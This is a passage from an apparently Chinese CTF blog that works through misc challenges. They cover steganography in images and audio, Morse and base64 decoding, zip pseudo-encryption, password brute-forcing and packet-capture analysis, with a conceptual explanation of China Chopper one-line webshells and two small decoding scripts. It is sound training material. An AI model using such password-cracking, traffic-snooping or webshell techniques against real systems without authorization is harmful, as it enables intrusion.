href="#隐藏的钥匙" class="headerlink" title="隐藏的钥匙"></a>隐藏的钥匙</h3><p>呐呐呐，属性、010，wait！010真的找出了东西哎！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129170005565.png" alt="image-20211129170005565"></p><p>依据提示，base64转码即可</p><hr><h3 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h3><p>属性，010，这次，我们又在010里找到了不寻常的地方</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129172208458.png" alt="image-20211129172208458"></p><p>一串2进制编码！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129172358141.png" alt="image-20211129172358141"></p><p>解码即可。</p><hr><h3 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h3><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129175426237.png" alt="image-20211129175426237"></p><p>在属性、010、binwalk无果后，我们来试试stegsolve，盲猜lsb（我只知道这个🐕）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129175853648.png" alt="image-20211129175853648"></p><p>左面似乎啥也没有，但我们在右面发现了重头戏！504B0304，不是压缩包的文件头吗！！！果断将其保存为哦压缩文件，暂且无视bandizip的损坏提醒，解压下来堪堪——这是啥？？？！！！</p><p>一头雾水的我选择使用file命令辨别其文件类型</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129180422750.png" alt="image-20211129180422750"></p><p>elf文件，这真的是道misc，不是pwn？？？</p><p>ida打开，堪堪main函数，神奇的事情出现了！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129180541272.png" alt="image-20211129180541272"></p><p>ok，解决了</p><hr><h3 id="假如给我三天光明"><a href="#假如给我三天光明" class="headerlink" title="假如给我三天光明"></a>假如给我三天光明</h3><p>ctfer当真啥都要会啊。。。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/pic.jpg" alt="pic"></p><p>别问，问就是盲文</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/202009091617300.png" alt="202009091617300"></p><p>解出来是“kmdonowg”，很明显是解压码，解压音频，拖入audacity，观察波形图</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211129175146065.png" alt="image-20211129175146065"></p><p>别问，问就是摩斯电码（一边对着一边打，眼要瞎了）</p><blockquote><p>-.-.  -  ..-.  .–  .–.  .  ..  —–  —..  –…  …–  ..—  ..–..  ..—  …–  -..  –..</p></blockquote><p>线上解码即可</p><hr><h3 id="神秘龙卷风"><a href="#神秘龙卷风" class="headerlink" title="神秘龙卷风"></a>神秘龙卷风</h3><p>依照题目所给信息爆破</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/%E7%A5%9E%E7%A7%98%E9%BE%99%E5%8D%B7%E9%A3%8E.png" alt="神秘龙卷风" style="zoom:50%;"><p>打开压缩包文本，发现神秘龙卷风</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130083144863.png" alt="image-20211130083144863" style="zoom: 33%;"><p>很明显是brainfuck，在线解码即可</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130083228685.png" alt="image-20211130083228685" style="zoom:67%;"><hr><h3 id="后门查杀"><a href="#后门查杀" class="headerlink" title="后门查杀"></a>后门查杀</h3><p>后门查杀，就查杀后门呗😓</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181414306.png" alt="image-20211202181414306"></p><p>题目已经提醒了密码即为flag，搜索pass，即可找到</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181722647.png" alt="image-20211202181722647"></p><hr><h3 id="数据包中的线索"><a href="#数据包中的线索" class="headerlink" title="数据包中的线索"></a>数据包中的线索</h3><p>题目要交流内容，交流内容大概率是文本，因此我们把目标放在http协议上，过滤后，得到了以下四个。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202180930267.png" alt="image-20211202180930267"></p><p>emmm，接下来我是一个个看的😂，最后在返回页面的那个流里发现了不同的东西—好长一段编码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181046389.png" alt="image-20211202181046389"></p><p>bae64解码，flag出现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202181203879.png" alt="image-20211202181203879"></p><hr><h3 id="荷兰带宽数据泄露"><a href="#荷兰带宽数据泄露" class="headerlink" title="荷兰带宽数据泄露"></a>荷兰带宽数据泄露</h3><p>下载附件之后得到.bin文件，起初并不知道该怎么看，经过查找资料、例题之后，发现这是一个路由器信息恢复类问题，答案可能是username或者password，ctrl+F，果然是username。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211202174931265.png" alt="image-20211202174931265"></p><hr><h3 id="来首歌吧"><a href="#来首歌吧" class="headerlink" title="来首歌吧"></a>来首歌吧</h3><p>音频隐写，拖进audacity，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130083902936.png" alt="image-20211130083902936"></p><p>明显的摩斯</p><blockquote><p>… -… -.-. —-. …— … -… …- —-. -.-. -… —– .—- —… —… …-. … …— . -… .—- –… -… –… —– —-. …— —-. .—- —-. .—- -.-.</p></blockquote><p>在线转码即可出flag</p><hr><h3 id="Webshell后门"><a href="#Webshell后门" class="headerlink" title="Webshell后门"></a>Webshell后门</h3><p>emmm，这题和上面的某个题不能说一模一样，也只能说基本类似了，是哪个题我不说🤐</p><hr><h3 id="面具下的flag"><a href="#面具下的flag" class="headerlink" title="面具下的flag"></a>面具下的flag</h3><p>属性里有ps，打开之后无果，010没有思路，最后使用binwalk，发现了压缩包！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130084916891.png" alt="image-20211130084916891" style="zoom:50%;"><p>但当我们兴高采烈的准备爆破时</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130085128897.png" alt="image-20211130085128897"></p><p>为什么呢？—— 联系前面做题的经验，我们猜测是伪加密</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130092850611.png" alt="image-20211130092850611"></p><p>果然是，我们将其更改，如上图</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130093034197.png" alt="image-20211130093034197" style="zoom:50%;"><p>在试过多种方法后，我仍然一头雾水，最终在wp的帮助下解决此题（惭愧）</p><p>原来是把文件当压缩文件！</p><h4 id="7Z命令"><a href="#7Z命令" class="headerlink" title=" 7Z命令"></a><font color="red" size="5"> <strong>7Z命令</strong></font></h4><p><img src="https://www.icode9.com/i/ll/?i=2020112809574741.png?,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1OTQ2Mzg1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p><p>可以发现，文件就在其中一个压缩包里，密码爆破没给提示，只能从图片入手了，但是，属性、010、binwalk在图片里都没发现有用的东西，最终还是借助wp才做出这道题</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130225316574.png" alt="image-20211130225316574"></p><p>提取出了多个文件夹，其中两个明显提示有flag</p><p>one</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130225443219.png" alt="image-20211130225443219"></p><p>two</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130225509800.png" alt="image-20211130225509800"></p><p>解码即可</p><hr><h3 id="九连环"><a href="#九连环" class="headerlink" title="九连环"></a>九连环</h3><p>下载好图片后，属性没提示，但在010里搜flag发现了一些东西</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130130305519.png" alt="image-20211130130305519"></p><p>估计flag就在这个文档里，走，上binwalk！</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130130511145.png" alt="image-20211130130511145" style="zoom:50%;"><p>里面果然还有东西，把他们都提取出来</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130130838874.png" alt="image-20211130130838874"></p><h4 id="steghide的使用"><a href="#steghide的使用" class="headerlink" title="steghide的使用 "></a><font color="red" size="5"><strong>steghide的使用</strong> </font></h4><p>steghide的使用</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/20191006095037382.png" alt="img"></p><p>使用后，我们发现，出现了“ko.txt”这个文件，而它正是压缩包的密码，解压后，打开文档，本题结束。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211130131701943.png" alt="image-20211130131701943" style="zoom:50%;"><hr><h3 id="被劫持的神秘礼物"><a href="#被劫持的神秘礼物" class="headerlink" title="被劫持的神秘礼物"></a>被劫持的神秘礼物</h3><p>wireshark查看，从题目中“MD5”和“哈希”一下，我们可以推测我们要找的大概率是文本，因此我们优先追踪http流，果然不出所料。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207002614033.png" alt="image-20211207002614033"></p><p>嗯，然后随波逐流哈希一下，嗯</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207002552573.png" alt="image-20211207002552573"></p><p>此即为flagヾ(≧▽≦*)o</p><hr><h3 id="刷新过的图片"><a href="#刷新过的图片" class="headerlink" title="刷新过的图片"></a>刷新过的图片</h3><p>提到键盘上的刷新，自然想到F5键，由此我们确定了本题的隐写方式——F5隐写</p><h4 id="F555"><a href="#F555" class="headerlink" title="F555"></a><font color="red"><strong>F555</strong></font></h4><blockquote><p>java Extract “待提取的图片路径”</p></blockquote><p>即会提取出其中文件，如下：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211206235445647.png" alt="image-20211206235445647"></p><p>我们查看解出的文件，发现一堆乱码，便怀疑不是文本文件，于是用file一看，果然不是</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207000820364.png" alt="image-20211207000820364"></p><p>拖到win里更改后缀，发现解压需要解压码，于是去爆破</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207002648795.png" alt="image-20211207002648795"></p><p>为什么没有文件？—— 依照前面的经验，怀疑是伪加密</p><p>果然是</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207003202319.png" alt="image-20211207003202319"></p><p>解出来了！！！睡觉！！！</p><hr><h3 id="Snake"><a href="#Snake" class="headerlink" title="Snake"></a>Snake</h3><p>属性没啥东西哦，然后堪堪010，结果发现以下·信息</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207081456197.png" alt="image-20211207081456197"></p><p>但是——没啥用，还是老老实实binwalk吧</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207081923254.png" alt="image-20211207081923254" style="zoom: 67%;"><p>提取出的文件如下所示</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207082040847.png" alt="image-20211207082040847"></p><p>cipher里一堆乱码，看key，key里是如下文本</p><blockquote><p>V2hhdCBpcyBOaWNraSBNaW5haidzIGZhdm9yaXRlIHNvbmcgdGhhdCByZWZlcnMgdG8gc25ha2VzPwo=</p></blockquote><p>明显的base64，解码得</p><blockquote><p>What is Nicki Minaj’s favorite song that refers to snakes?</p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207082546271.png" alt="image-20211207082546271"></p><p>想来应该key是Anaconda(水蚺—南美洲蟒蛇)，但问题又来了，这是个什么编码？？？</p><p>最后经过查看WP，才知晓，这是一种名为“Serpent (蛇; 尤指大蛇;)”，合着这题真就snake了</p><h4 id="Serpent"><a href="#Serpent" class="headerlink" title="Serpent"></a><font color="red"><strong>Serpent</strong></font></h4><blockquote><p>在线解码网址：<a href="http://serpent.online-domain-tools.com/">http://serpent.online-domain-tools.com/</a></p></blockquote><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207084605840.png" alt="image-20211207084605840"></p><p>flag解出。</p><hr><h3 id="认真你就输了"><a href="#认真你就输了" class="headerlink" title="认真你就输了"></a>认真你就输了</h3><p>下载得到xls文件，打开时提示文件错误，于是用010一看</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207163333416.png" alt="image-20211207163333416"></p><p>有戏！！！</p><p>binwalk -e一下，压缩包没加密，解压完找到文件即可</p><hr><h3 id="藏藏藏"><a href="#藏藏藏" class="headerlink" title="藏藏藏"></a>藏藏藏</h3><p>属性、010都没啥，用binwalk发现有zip，解压即可得到二维码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207173626114.png" alt="image-20211207173626114"></p><hr><h3 id="被偷走的文件"><a href="#被偷走的文件" class="headerlink" title="被偷走的文件"></a>被偷走的文件</h3><p>又是流量分析，祭出wireshark，根据题目所给提示我们应该<font color="red"><strong>查找ftp来看文件传输</strong></font>，如下所示</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207174256544.png" alt="image-20211207174256544"></p><p>将文件提取出来，目标即是rar文件，因此使用binwalk命令进行分解，得到压缩包，需要密码？</p><p>爆破即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207174638285.png" alt="image-20211207174638285"></p><p>此题结束。</p><hr><h3 id="菜刀666"><a href="#菜刀666" class="headerlink" title="菜刀666"></a>菜刀666</h3><h4 id="菜刀与一句话木马"><a href="#菜刀与一句话木马" class="headerlink" title=" 菜刀与一句话木马"></a><font color="red"> <strong>菜刀与一句话木马</strong></font></h4><p>有个菜刀叫中国菜刀，有个木马叫一句话木马，因为隐蔽且传输量大，一般工具都是<em><strong>POST</strong></em>方式传参，所以一句话一般写_POST，把这个一句话木马挂到一个网页上，用‘菜刀’连接这一句话木马，一旦它运行，凭借这一句话木马就可以获取网站的管理权限。</p><p>由上可知，我们需要看其post，直接追踪http流</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207222718294.png" alt="image-20211207222718294"></p><p>发现了好东西！</p><hr><h3 id="佛系青年"><a href="#佛系青年" class="headerlink" title="佛系青年"></a>佛系青年</h3><p>压缩包直接打不开？爆破不显示文件？</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207180029534.png" alt="image-20211207180029534"></p><p>应该是伪加密吧。</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207180229245.png" alt="image-20211207180229245">、</p><p>果然是！</p><p>提取压缩包之后，我们发现有文本文件</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207180421933.png" alt="image-20211207180421933"></p><p>与佛论禅！！！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207180357026.png" alt="image-20211207180357026"></p><p>论完了，出来了</p><hr><h3 id="你猜我是个啥"><a href="#你猜我是个啥" class="headerlink" title="你猜我是个啥"></a>你猜我是个啥</h3><p>压缩包打开显示格式错误，直接上010堪堪，惊喜出现了！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211207225626941.png" alt="image-20211207225626941"></p><h3 id="神奇的二维码"><a href="#神奇的二维码" class="headerlink" title="神奇的二维码"></a>神奇的二维码</h3><p>这个题…恶心人！！！<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/QQ%E5%9B%BE%E7%89%8720211208174259.jpg" alt="QQ图片20211208174259"></p><p>先扫描神奇的二维码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208174423132.png" alt="image-20211208174423132"></p><p>嗯，神奇之处其在于它一点都不神奇，010无事，上binwalk</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208174527392.png" alt="image-20211208174527193"></p><p>提取出来之后（做完再写的wp，可能有的删了）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208174557025.png" alt="image-20211208174557025"></p><p>encode内容如下：</p><blockquote><p>YXNkZmdoamtsMTIzNDU2Nzg5MA==</p></blockquote><p>明显的base64，解码如下：</p><blockquote><p>asdfghjkl1234567890</p></blockquote><p>用这个我们能解压出另一个文件（好像是文档？）</p><p>然后最讨厌的第一个地方来了，里面是一段超~长的base64，接下来解码极其烦人，大约套了20层，下面展示两张</p><table frame="void">    <!--使用table标签，且frame=void消除外边框-->    <tr>           <!--<tr>一行的内容<\tr>，<td>一个格子的内容<\td>-->    <td><center><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208175731349.png" alt="第一张图片显示不出时显示的文字" height="填数字作为高度"></center></td>    <!--<center>标签将图片居中-->    <td><center><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208175842545.png" alt="第二张图片显示不出时显示的文字" height="高度一致会好看"></center></td>    </tr></table><p>出来的——还不是flag！！！<img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/QQ%E5%9B%BE%E7%89%8720211208174259.jpg" alt="QQ图片20211208174259"></p><p>解压音频文件，au一看</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208180058079.png" alt="image-20211208180058079"></p><p>呦，这不是最——最讨人厌的摩斯吗？？？！！！🐶</p><p>消耗眼睛手打</p><blockquote><p>–/—/.-./…/./…/…/…-/./.-./-.–/…-/./.-./-.–/./.-/…/-.–</p></blockquote><p>网站解码即可，flag出现！！！</p><h4 id="morse2ascii"><a href="#morse2ascii" class="headerlink" title="morse2ascii"></a><font color="red"><strong>morse2ascii</strong></font></h4><p>看wp时发现，大佬是这样做的：</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211208180416334.png" alt="image-20211208180416334"></p><h4 id="BASECRACK！"><a href="#BASECRACK！" class="headerlink" title="BASECRACK！"></a><font color="red"><strong>BASECRACK！</strong></font></h4><p>原来有个工具叫basecrack！！！</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209224015724.png" alt="image-20211209224015724"></p><hr><h3 id="一叶障目"><a href="#一叶障目" class="headerlink" title="一叶障目"></a>一叶障目</h3><p>解压文件后，PNG图片能够正常打开，属性也没问题，用010堪堪</p><p>提示这个</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209083542429.png" alt="image-20211209083542429"></p><p>经查找，发现这个错误一般都是修改宽高造成的，所以我们修改宽高</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211209083922329.png" alt="image-20211209083922329"></p><p>ok</p><hr><h3 id="just-a-rar"><a href="#just-a-rar" class="headerlink" title="just_a_rar"></a>just_a_rar</h3><p>解压——爆破——解压——属性——flag</p><hr><h3 id="鸡你太美"><a href="#鸡你太美" class="headerlink" title="鸡你太美"></a>鸡你太美</h3><p>下下来之后，发现两个后缀都为gif的附件，属性没有问题，打开010查看，发现副本报错，因为都是gif文件，对比后发现副本没有文件头，添加上去，即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211211101258140.png" alt="image-20211211101258140"></p><hr><h3 id="穿越时空的思念"><a href="#穿越时空的思念" class="headerlink" title="穿越时空的思念"></a>穿越时空的思念</h3><p>拖入au</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210202502628.png" alt="image-20211210202502628"></p><p>思路一：不就是摩斯？直接手打，解码即可</p><p>思路二：分离声道，kali分析（没想起来，做完看的WP哈哈哈）</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210202647450.png" alt="image-20211210202647450"></p><hr><h3 id="纳尼"><a href="#纳尼" class="headerlink" title="纳尼"></a>纳尼</h3><p>属性无问题，文件打不开，堪堪010，果然，缺少文件头，补上，可以打开。</p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/6.gif" alt="6" style="zoom: 50%;"><p>动图内容如下</p><blockquote><p>Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=</p></blockquote><p>明显的base64，解码即可</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211211102340120.png" alt="image-20211211102340120"></p><hr><h3 id="outguess"><a href="#outguess" class="headerlink" title="outguess"></a>outguess</h3><h4 id="outguess-1"><a href="#outguess-1" class="headerlink" title="outguess"></a><font color="red"><strong>outguess</strong></font></h4><p>安装：</p><blockquote><p>git clone <a href="https://github.com/crorvick/outguess]">https://github.com/crorvick/outguess]</a></p><p>cd进文件夹</p><p>./configure &amp;&amp; make &amp;&amp; make install</p></blockquote><p>使用：</p><blockquote><p>outguess -k 密钥 -d 文件名 存放文件</p></blockquote><p>下载下来之后先看属性，</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210210914672.png" alt="image-20211210210914672"></p><p>明显的社会主义核心价值观编码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210210950958.png" alt="image-20211210210950958"></p><p>经过查找后，我们发现outguess是一种隐写方式</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211210211102425.png" alt="image-20211210211102425"></p><hr><h3 id="excel爆破"><a href="#excel爆破" class="headerlink" title="excel爆破"></a>excel爆破</h3><p>直接打开文件显示需要密码，选择改变文件后缀名，打开txt，发现内容不少</p><p>直接搜索flag，查到</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20211214143625902.png" alt="image-20211214143625902"></p><hr><h2 id="HBNIS2018-来题中等的吧"><a href="#HBNIS2018-来题中等的吧" class="headerlink" title="[HBNIS2018]来题中等的吧"></a>[HBNIS2018]来题中等的吧</h2><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220125213501607.png" alt="image-20220125213501607"></p><p>很明显是摩斯码，解码</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220125213536468.png" alt="image-20220125213536468"></p><p>大写不行，试了试小写的，就过了。。。</p><hr><h2 id="GXYCTF2019-gakki"><a href="#GXYCTF2019-gakki" class="headerlink" title="[GXYCTF2019]gakki"></a>[GXYCTF2019]gakki</h2><p>图片本身什么注意点，binwalk提取压缩包，爆破四位弱密码，得到如下</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220125222617317.png" alt="image-20220125222617317"></p><p>木大思路，慕达思路！！！！！！最后得知了是用字符统计</p><h4 id="字符统计"><a href="#字符统计" class="headerlink" title="字符统计"></a><font color="red"><strong>字符统计</strong></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">alphabet = <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890!@#$%^&amp;*()_+- =\\&#123;\\&#125;[]&quot;</span></span><br><span class="line">string = <span class="built_in">open</span>(<span class="string">&#x27;./flag.txt&#x27;</span>).read()</span><br><span class="line"></span><br><span class="line">result = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> alphabet:</span><br><span class="line">    counts = string.count(i)</span><br><span class="line">    i = <span class="string">&#x27;&#123;0&#125;&#x27;</span>.<span class="built_in">format</span>(i)</span><br><span class="line">    result[i] = counts</span><br><span class="line"></span><br><span class="line">res = <span class="built_in">sorted</span>(result.items(), key = <span class="keyword">lambda</span> item: item[<span class="number">1</span>], reverse = <span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> data <span class="keyword">in</span> res:</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> res:</span><br><span class="line">    flag = <span class="built_in">str</span>(i[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(flag[<span class="number">0</span>], end = <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="WUSTCTF2020-find-me"><a href="#WUSTCTF2020-find-me" class="headerlink" title="[WUSTCTF2020]find_me"></a>[WUSTCTF2020]find_me</h2><p>附件属性，盲文解密，pass</p><hr><h2 id="ACTF新生赛2020-base64隐写"><a href="#ACTF新生赛2020-base64隐写" class="headerlink" title="[ACTF新生赛2020]base64隐写"></a>[ACTF新生赛2020]base64隐写</h2><p>扫码，无用，看，文档，base64，隐写，上，脚本（大佬写的）</p><h4 id="base64"><a href="#base64" class="headerlink" title="base64"></a><font color="red"><strong>base64</strong></font></h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_base64_diff_value</span>(<span class="params">s1, s2</span>):</span></span><br><span class="line">    base64chars = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    res = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(s2)):</span><br><span class="line">        <span class="keyword">if</span> s1[i] != s2[i]:</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">abs</span>(base64chars.index(s1[i]) - base64chars.index(s2[i]))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_stego</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;3.txt&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        file_lines = f.readlines()</span><br><span class="line">        bin_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> file_lines:</span><br><span class="line">            steg_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            norm_line = line.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;base64&#x27;</span>).encode(<span class="string">&#x27;base64&#x27;</span>).replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            diff = get_base64_diff_value(steg_line, norm_line)</span><br><span class="line">            <span class="built_in">print</span> diff</span><br><span class="line">            pads_num = steg_line.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> diff:</span><br><span class="line">                bin_str += <span class="built_in">bin</span>(diff)[<span class="number">2</span>:].zfill(pads_num * <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                bin_str += <span class="string">&#x27;0&#x27;</span> * pads_num * <span class="number">2</span></span><br><span class="line">            <span class="built_in">print</span> goflag(bin_str)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">goflag</span>(<span class="params">bin_str</span>):</span></span><br><span class="line">    res_str = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, <span class="built_in">len</span>(bin_str), <span class="number">8</span>):</span><br><span class="line">        res_str += <span class="built_in">chr</span>(<span class="built_in">int</span>(bin_str[i:i + <span class="number">8</span>], <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res_str</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    solve_stego()</span><br></pre></td></tr></table></figure><hr><h2 id="SWPU2019-伟大的侦查"><a href="#SWPU2019-伟大的侦查" class="headerlink" title="[SWPU2019]伟大的侦查"></a>[SWPU2019]伟大的侦查</h2><p>压缩包的密码文件可以解压，打开发现</p><p><img src="https://wzn0410.oss-cn-beijing.aliyuncs.com/img/CTF/image-20220127194053640.png" 